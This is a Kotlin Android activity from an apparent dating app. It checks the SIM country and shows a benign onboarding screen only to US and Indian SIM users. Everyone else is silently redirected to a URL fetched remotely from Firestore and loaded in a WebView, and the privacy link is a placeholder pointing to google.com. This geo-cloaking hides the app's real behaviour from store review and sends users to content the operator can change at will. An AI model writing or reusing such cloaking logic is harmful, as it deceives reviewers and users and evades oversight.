package ru.date.datingfinder.navigation

import android.content.Context
import android.content.Intent
import android.content.res.ColorStateList
import android.net.Uri
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.widget.ImageViewCompat
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import kotlinx.android.synthetic.main.activity_main.*
import ru.date.datingfinder.R
import ru.date.datingfinder.WebActivity

class MainActivity : AppCompatActivity() {
    private var checked = false
    private val US_IN = listOf("us", "in")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        val manager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val ans =
            US_IN.contains(manager.simCountryIso) && manager.simOperatorName.isNotEmpty()

        if (ans) {
            setUI()
        } else
            getURL()
    }
    private fun getURL() {

        val g = FirebaseFirestore.getInstance();
        val h = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()

        g.firestoreSettings = h
        var oBool = false

        g.collection("data").get().addOnCompleteListener { task ->

            if (task.isSuccessful) for (document in task.result!!)
                if (document.data["value"].toString().length > 1) {

                    oBool = true
                    val message = document.data["value"] as String
                    goLink(message)

                }
            if (!oBool) setUI()
        }.addOnFailureListener { setUI() }
    }

    private fun goLink(url: String) {
        val i = Intent(this, WebActivity::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()
    }


    fun setUI() {
        pg_bar.visibility=View.GONE
        native_lw.visibility=View.VISIBLE


        privacy_link.setOnClickListener {
            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com")))
        }

        check_policy.setOnClickListener {
            if (!checked) {
                controlButtonView()
                checked = true
                check_policy.isChecked = checked
            } else {
                checked = false
                check_policy.isChecked = checked
                controlButtonView()
            }

        }
        btn_next.setOnClickListener {
            if (btn_next.isEnabled) {
                startActivity(Intent(this, SecondActivity::class.java))
                finish()
            }
        }
    }


    fun controlButtonView() {
        if (check_policy.isChecked && name_et.text.toString().isNotEmpty()) {
            btn_next.isEnabled = true
            btn_next.setTextColor(ContextCompat.getColor(this,
                R.color.colorWhite
            ))
            ImageViewCompat.setImageTintList(
                next_image,
                ColorStateList.valueOf(ContextCompat.getColor(this,
                    R.color.colorWhite
                ))
            )
        } else {
            btn_next.isEnabled = false
            btn_next.setTextColor(ContextCompat.getColor(this,
                R.color.colorGrayDark
            ))
            ImageViewCompat.setImageTintList(
                next_image,
                ColorStateList.valueOf(ContextCompat.getColor(this,
                    R.color.colorGrayDark
                ))
            )
        }
    }
}